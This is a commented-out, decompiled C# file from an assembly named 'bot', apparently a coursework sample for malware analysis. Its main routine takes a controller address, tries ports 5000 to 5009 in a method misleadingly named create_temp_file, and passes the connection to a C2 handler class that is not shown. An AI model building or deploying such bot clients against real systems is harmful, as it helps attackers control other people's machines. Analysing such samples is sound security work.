//// Decompiled with JetBrains decompiler
//// Type: ns0.Class0
//// Assembly: bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
//// MVID: B05469C7-C319-41CF-853E-3338A96927EC
//// Assembly location: C:\Users\blang\Documents\BillsCoursework\cw_2024_2025\b-cleaned.exe

//using System;
//using System.Net.Sockets;

//#nullable disable
//namespace ns0
//{
//  internal class Class0
//  {
//    private static int Main(string[] args)
//    {
//      string str = "";
//      Console.WriteLine("Bot Version 7.0 - 2024/2025");
//      int int_0_1 = 5000;
//      int num;
//      if (args.Length == 0)
//      {
//        Console.WriteLine("Please run with bot w.x.y.z, where w.x.y.z is the address of your controller. \r\nVersion 7.0");
//        num = 0;
//      }
//      else
//      {
//        if (args.Length > 0)
//          str = args[0];
//        if (args.Length > 1)
//          Console.WriteLine("Hello: " + args[1]);
//        bool flag = false;
//        int int_0_2 = Class0.create_temp_file(str, int_0_1);
//        if (int_0_2 == 0)
//        {
//          Console.WriteLine("Giving up!");
//          num = 0;
//        }
//        else
//        {
//          try
//          {
//            Console.Write("[+]");
//            Class1 class1 = new Class1(str, int_0_2);
//          }
//          catch (Exception ex)
//          {
//            if (flag)
//              Console.WriteLine(ex.Message);
//          }
//          num = 0;
//        }
//      }
//      return num;
//    }

//    private static int create_temp_file(string string_0, int int_0)
//    {
//      int num;
//      for (int index = 0; index < 10; ++index)
//      {
//        try
//        {
//          new TcpClient().Connect(string_0, int_0 + index);
//          Console.Write("?");
//          num = int_0 + index;
//          goto label_6;
//        }
//        catch (Exception ex)
//        {
//          Console.Write("$");
//        }
//      }
//      num = 0;
//label_6:
//      return num;
//    }
//  }
//}
